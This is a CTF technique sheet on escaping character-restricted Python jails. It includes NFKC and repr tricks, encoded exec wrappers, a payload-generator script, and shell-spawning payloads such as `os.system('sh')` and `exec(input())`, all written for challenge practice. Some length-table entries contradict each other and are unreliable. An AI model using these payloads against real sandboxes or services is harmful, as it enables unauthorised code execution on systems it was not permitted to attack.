---
title: "Python Jail - Character-Restricted Payloads"
category: misc
subcategory: pyjail
type: technique
tags: [pyjail, jail-escape, no-letters, no-digits, no-underscore, no-parentheses, no-quotes, length-limited, nfkc, unicode-normalization, fullwidth, blacklist-bypass, getattr, chr, exec, sandbox-escape]
difficulty: hard
summary: "When the filter bans letters, digits, underscores, dots, quotes or parentheses, rebuild them from what is left."
when_to_use:
  - "The jail rejects your payload on a substring or character-class check"
  - "Input length is capped at 10-20 characters"
  - "Only a whitelist of symbols is allowed"
  - "You can pass the check but not construct the string you need"
tools: [python3]
related: [python-jail-escape, eval-jail-generic, jail-escape-payloads, shell-jail-escape, ctf-general-cheatsheet]
---

## TL;DR

Every restriction has a standard workaround: digits come from `True+True` or `len(...)`,
letters come from `chr()` or from the `repr` of builtins, underscores come from Unicode
confusables that NFKC-normalise back to `_`, dots come from `getattr`, quotes come from
`str()`/`bytes()`/`chr()`, and parentheses come from decorators and comparison chains.
The last resort for every one of them is `exec(input())`.

## Recognise it

```python
# typical guards
if re.search(r"[a-zA-Z]", inp):   raise SystemExit("no letters")
if re.search(r"[0-9]", inp):      raise SystemExit("no digits")
if "_" in inp:                    raise SystemExit("no underscores")
if len(inp) > 12:                 raise SystemExit("too long")
if set(inp) - set("()[]{}+*/-<>=,.'\"" ): raise SystemExit("bad chars")
```

## No digits

```python
True + True          # 2   (bool is an int subclass)
True + True + True   # 3
-~0                  # 1   (two's complement: -(-1) == 1)
-~-~0                # 2
len([[]])            # 1
len("aa")            # 2
len(str(True))       # 4  ('True')
ord(min(str()))      # careful: min of '' raises; use ord(max(str(True)))
int(True)            # 1
[[]].__len__()       # 1
```

Building an arbitrary integer N with no digits: `-~-~-~...-~0` (N repetitions) is O(N)
characters; for larger values use `len(str(...))` on something whose length you control, or
shift: `(True<<(True+True+True))` is 8.

## No letters

The classic trick is **Unicode normalisation**. Python source is normalised with **NFKC**
before identifiers are resolved, so a fullwidth or mathematical-alphanumeric character that
NFKC-folds to an ASCII identifier character works as that identifier:

```python
# these are all valid and refer to the normal builtins
ｅｘｅｃ("import os")        # U+FF45 U+FF58 U+FF45 U+FF43, fullwidth 'exec'
𝘦𝘹𝘦𝘤("import os")          # mathematical italic small letters
ⅇxec                        # U+2147 DOUBLE-STRUCK ITALIC SMALL E
```

Note this works for **identifiers**, not for string literals: `"ｏｓ"` stays fullwidth inside a
string. So use it to reach `exec`/`eval`/`chr`/`getattr`, then build your strings numerically.

Other letter-free sources of characters:

```python
chr(-~-~...)                       # any character, if chr is reachable without letters
str(())[True]                      # '(' -> repr of an empty tuple is '()' ; index 1 is ')'
str({})[True]                      # '}'
str(...)                           # 'Ellipsis' - a free source of the letters E,l,i,p,s
str(True)                          # 'True'  -> T,r,u,e
str(False)                         # 'False' -> F,a,l,s,e
str(str)                           # "<class 'str'>" -> c,l,a,s,'
str(().__class__)                  # "<class 'tuple'>"
str({}.values())                   # 'dict_values([])' -> _ , d,i,c,t,v,a,l,u,e,s
str(().__doc__)                    # a whole sentence of letters
```

`str({}.values())` is the key one: it contains an **underscore**, which is how you get `_`
when `_` itself is filtered and normalisation is blocked.

## No underscores

```python
# 1. unicode confusables that NFKC-normalise to '_'
#    U+FF3F FULLWIDTH LOW LINE normalises to '_'
getattr((), "＿＿class＿＿")        # NO - normalisation applies to source, not to string data
# ... so instead take the underscore from a repr:
u = str({}.values())[4]            # 'dict_values([])'[4] == '_'
getattr((), u + u + "class" + u + u)

# 2. avoid dunder names entirely
vars(obj)                          # instead of obj.__dict__
type(obj)                          # instead of obj.__class__
type(obj).mro()                    # instead of __mro__
dir(obj)                           # discover what is there
type(()).mro()[1].__subclasses__() # still needs __subclasses__ ... use:
[c for c in type.__subclasses__(type(()).mro()[1])]   # unbound call, same thing
```

`type.__subclasses__(object)` is the underscore-free-ish spelling; if even that is blocked,
`object.__subclasses__` can be reached through `getattr` with a runtime-built string.

## No dots

```python
getattr(obj, "attr")               # the universal replacement
obj["key"]                         # for mappings
vars(obj)["attr"]                  # for anything with a __dict__
# operator module equivalents (if importable)
from operator import attrgetter, itemgetter, methodcaller
attrgetter("a.b.c")(obj)           # chained attribute access in one call
methodcaller("system", "sh")(os_module)
```

## No quotes

```python
chr(-~-~-~-~-~-~-~-~-~-~-~-~...)   # build each character, then join with +
str(())[True]                      # slice characters out of reprs (see above)
bytes([115, 104]).decode()         # 'sh'  (needs digits)
"".join(map(chr, [115, 104]))      # needs one empty string literal
().__doc__[3]                      # index into any existing docstring
# and the pragmatic answer:
exec(input())                      # your quotes now live in stdin, not in the source
eval(input())
```

`exec(input())` is 13 characters and defeats *every* character filter on the source, because
the filter never sees the second line. Always try it first.

## No parentheses

Calling without `()` is the hard one. Options:

```python
# 1. decorators call the decorated object with the class/function as the argument
@exec
class X:
    pass          # calls exec(X) -> TypeError, but the call HAPPENED
                  # useful when the callee has side effects on any argument

# 2. operators invoke dunder methods
obj1 @ obj2       # __matmul__
obj1 < obj2       # __lt__
-obj              # __neg__
obj[k]            # __getitem__

# 3. exception handling calls the class
raise Exception   # instantiates without parentheses in older syntax forms

# 4. comprehension + assignment expressions do work without calls
[y := x for x in [1]]

# 5. import statement needs no parentheses at all
import os
os.system                        # ... but calling it still does
```

In practice, no-parentheses jails are usually `exec`-based (statements allowed), so the answer
is `import os` plus a decorator or an `os.system`-in-a-class-body trick, or simply
`breakpoint` if it is auto-invoked.

## Length-limited payloads

| Length | Payload | Notes |
| --- | --- | --- |
| 5 | `breakpoint()`? no, 12 | |
| 12 | `breakpoint()` | drops to pdb if builtins survive |
| 13 | `exec(input())` | the universal answer |
| 12 | `eval(input())` | expression only |
| 14 | `exec(input(1))` | when `input()` prompt matters |
| 18 | `exec(open('x').read())` is 22 | upload a file first if you can |
| 25 | `__import__('os').system('sh')` is 29 | |
| 22 | `import os;os.system('sh')` is 25 | |

If the limit is below 12, look for a name already in scope (`f`, `g`, `x`) or repeated input:
many jails loop, so you can build a long payload across several short lines by appending to a
name: `a=input()`, `a+=input()`, `exec(a)`.

## Blacklisted substrings

```python
# split the word across concatenation or a variable
"o"+"s"                     # defeats a literal "os" check
"".join(["o","s"])
"os"[::-1][::-1]
getattr(__import__("o"+"s"), "sys"+"tem")("sh")
# encodings (the filter checks source, not the decoded value)
exec(bytes.fromhex("696d706f7274206f73"))          # 'import os'
exec(__import__("base64").b64decode("aW1wb3J0IG9z"))
exec("\x69\x6d\x70\x6f\x72\x74\x20\x6f\x73")       # hex escapes in a literal
exec("\151\155\160\157\162\164\40\157\163")        # octal escapes
exec(bytes([105,109,112,111,114,116]).decode())
# source-encoding trick: a file whose declared coding decodes an escaped payload
# coding: unicode_escape   (as the first or second line of a FILE, not of an eval string)
```

The `unicode_escape` source-encoding trick matters when the challenge imports *your file*:
with `# coding: unicode_escape` at the top, the literal text `\x69\x6d\x70...` in the file is
decoded into real source before the tokenizer runs, so a source-level grep sees only escapes.

## Code

```python
#!/usr/bin/env python3
"""Payload generators for character-restricted pyjails.

  python3 restricted.py digits 1337
  python3 restricted.py chars "import os"
  python3 restricted.py nfkc exec
  python3 restricted.py --selftest
"""
from __future__ import annotations

import sys
import unicodedata


def int_no_digits(n: int) -> str:
    """An expression evaluating to n using no digit characters."""
    if n == 0:
        return "(True-True)"
    if n < 0:
        return "-" + int_no_digits(-n)
    # binary construction: much shorter than n repetitions of -~
    bits = bin(n)[2:]
    one = "True"
    parts = []
    for i, b in enumerate(reversed(bits)):
        if b == "1":
            if i == 0:
                parts.append(one)
            else:
                shift = int_no_digits(i) if i > 1 else one
                parts.append(f"({one}<<{shift})")
    return "(" + "+".join(parts) + ")"


def str_no_quotes(s: str) -> str:
    """An expression evaluating to s using chr() and no string literals or digits."""
    return "+".join(f"chr({int_no_digits(ord(c))})" for c in s)


def str_from_reprs(target: str) -> str | None:
    """Build a string by indexing into the reprs of literal-free objects."""
    sources = {
        "str(())": "()",
        "str({})": "{}",
        "str([])": "[]",
        "str(True)": "True",
        "str(False)": "False",
        "str(...)": "Ellipsis",
        "str({}.values())": "dict_values([])",
        "str(().__class__)": "<class 'tuple'>",
        "str(int)": "<class 'int'>",
    }
    parts = []
    for ch in target:
        for expr, text in sources.items():
            idx = text.find(ch)
            if idx != -1:
                parts.append(f"{expr}[{int_no_digits(idx)}]")
                break
        else:
            return None
    return "+".join(parts)


def hex_exec(code: str) -> str:
    return f'exec(bytes.fromhex("{code.encode().hex()}"))'


def escape_exec(code: str) -> str:
    body = "".join(f"\\x{b:02x}" for b in code.encode())
    return f'exec("{body}")'


def nfkc_variants(identifier: str) -> list[str]:
    """Unicode spellings of an identifier that NFKC-normalise back to it."""
    maps: list[dict[str, str]] = []
    # fullwidth forms U+FF01..U+FF5E map to ASCII 0x21..0x7E
    maps.append({chr(c): chr(0xFF01 + c - 0x21) for c in range(0x21, 0x7F)})
    # mathematical italic small a-z: U+1D608.. is sans-serif italic; use bold italic 1D482
    maps.append({chr(ord("a") + i): chr(0x1D482 + i) for i in range(26)})
    # mathematical monospace small a-z
    maps.append({chr(ord("a") + i): chr(0x1D68A + i) for i in range(26)})
    out = []
    for m in maps:
        cand = "".join(m.get(c, c) for c in identifier)
        if unicodedata.normalize("NFKC", cand) == identifier and cand != identifier:
            out.append(cand)
    return out


def underscore_free_getattr(obj_expr: str, attr: str) -> str:
    """getattr(obj, name) where the name is built without a literal underscore."""
    us = "str({}.values())[" + int_no_digits(4) + "]"   # 'dict_values([])'[4] == '_'
    pieces: list[str] = []
    for i, part in enumerate(attr.split("_")):
        if i:
            pieces.append(us)
        if part:
            pieces.append(repr(part))
    return f"getattr({obj_expr}, {'+'.join(pieces)})"


SHORT_PAYLOADS = [
    ("exec(input())", 13, "the universal bypass: the filter never sees the second line"),
    ("eval(input())", 13, "expression-only variant"),
    ("breakpoint()", 12, "pdb prompt if builtins survive"),
    ("exec(input(1))", 14, "when input() needs an argument"),
    ("import os", 9, "if statements are allowed but calls are filtered"),
    ("help()", 6, "interactive pager -> '!sh' on some systems"),
    ("license()", 9, "another interactive pager"),
    ("__import__('os').system('sh')", 29, "full one-liner"),
    ("import os;os.system('sh')", 25, "shorter statement form"),
    ("open('/flag').read()", 20, "when you only need a file read"),
    ("print(open('/flag').read())", 27, "with output"),
]


def _selftest() -> None:
    # digit-free integers
    for n in (0, 1, 2, 3, 7, 8, 42, 255, 1337, 65536):
        expr = int_no_digits(n)
        assert not any(c.isdigit() for c in expr), expr
        assert eval(expr) == n, (n, expr, eval(expr))

    # quote-free strings
    for s in ("os", "sh", "import os"):
        expr = str_no_quotes(s)
        assert '"' not in expr and "'" not in expr, expr
        assert not any(c.isdigit() for c in expr), expr
        assert eval(expr) == s, (s, eval(expr))

    # strings built by indexing into reprs (no quotes, no chr)
    for s in ("class", "tuple", "_"):
        expr = str_from_reprs(s)
        assert expr is not None, s
        assert eval(expr) == s, (s, eval(expr))

    # hex / escape exec wrappers really execute
    ns: dict = {}
    exec(hex_exec("x = 6*7"), ns)
    assert ns["x"] == 42
    ns2: dict = {}
    exec(escape_exec("y = 'sh'"), ns2)
    assert ns2["y"] == "sh"

    # NFKC identifier spellings
    variants = nfkc_variants("exec")
    assert variants, "no NFKC variant produced"
    for v in variants:
        assert unicodedata.normalize("NFKC", v) == "exec"
        assert not v.isascii()
        # and they really work as identifiers
        ns3: dict = {"exec": exec}
        src = f"{v}('z = 1+1')"
        exec(src, ns3)
        assert ns3["z"] == 2, src

    # underscore-free getattr expression
    expr = underscore_free_getattr("()", "__class__")
    assert "_" not in expr, expr
    assert eval(expr) is tuple, eval(expr)

    # repr sources really contain what the table claims
    assert str({}.values())[4] == "_"
    assert str(())[1] == ")"
    assert str(...) == "Ellipsis"

    print(f"selftest ok: digit-free ints, quote-free strings, repr indexing, "
          f"hex/escape exec, {len(variants)} NFKC spellings, underscore-free getattr")


def main() -> int:
    if len(sys.argv) < 2 or sys.argv[1] == "--selftest":
        _selftest()
        return 0
    cmd = sys.argv[1]
    if cmd == "digits":
        print(int_no_digits(int(sys.argv[2])))
    elif cmd == "chars":
        code = sys.argv[2]
        print("# no quotes:", str_no_quotes(code))
        print("# hex exec :", hex_exec(code))
        print("# esc exec :", escape_exec(code))
    elif cmd == "nfkc":
        for v in nfkc_variants(sys.argv[2]):
            print(v)
    elif cmd == "short":
        for p, n, note in SHORT_PAYLOADS:
            print(f"{n:>3}  {p:<32} {note}")
    else:
        print(__doc__)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

## Variants and pitfalls

- **Try `exec(input())` first.** It is 13 characters, defeats every source filter, and most
  authors forget it.
- **NFKC normalisation applies to identifiers, not to string literals or to `getattr` names.**
  `ｏｓ` as an identifier resolves to `os`; `"ｏｓ"` stays fullwidth.
- **`-~` chains are O(n) characters.** Use binary shifts (`(True<<(True+True))`) for big values.
- **`str({}.values())` is the underscore source.** Memorise the index: `'dict_values([])'[4]`.
- **The `@` decorator trick is a statement**, so it only helps in `exec` contexts.
- **Blacklists that check `chr`** - build it from `getattr(__builtins__, ...)` or take it from
  `().__doc__`.
- **Watch for normalisation happening twice.** Some jails normalise your input *before*
  checking, which kills the NFKC trick. Test with a harmless identifier first.
- **Length limits usually apply per line.** If the jail loops, concatenate across lines.
- **`input()` may be shadowed** by the jail. Check `dir()` first.
- **f-strings bypass some filters** because the expression inside `{}` is compiled separately:
  `f"{().__class__}"` evaluates attribute access even when `.` is only checked outside strings.

## Tools

`python3` on the same minor version as the target, `unicodedata` for confusable hunting,
`pwntools` for the interaction loop.

## References

- Python Language Reference, "Identifiers and keywords": identifiers are converted to the
  normal form NFKC before use - https://docs.python.org/3/reference/lexical_analysis.html
- CPython `bool` is a subclass of `int`, which is what makes `True+True == 2`.
- Python standard library `codecs` documentation for the `unicode_escape` codec.
